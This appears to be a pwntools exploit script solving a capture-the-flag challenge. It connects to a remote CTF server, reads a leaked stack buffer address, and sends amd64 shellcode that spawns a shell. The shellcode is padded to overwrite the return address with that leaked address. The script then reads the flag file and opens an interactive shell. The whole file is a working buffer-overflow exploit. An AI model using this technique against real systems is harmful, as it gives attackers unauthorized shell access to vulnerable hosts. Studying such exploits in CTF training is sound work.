from pwn import *

context.arch = 'amd64'

local = False
if local:
    r = process('./shellcode')
else:
    r = remote('ctf.adl.csie.ncu.edu.tw', 11003)

sh = asm(shellcraft.amd64.linux.sh())
# raw_input('pause')
r.recvuntil('Your input buffer address is ')
addr = r.recvline()
hex_addr = int(addr, 16)
payload = sh + 'a' * (120 - len(sh)) + p64(hex_addr)
r.sendline(payload)
r.sendline('cat /home/shellcode/flag')
r.interactive()
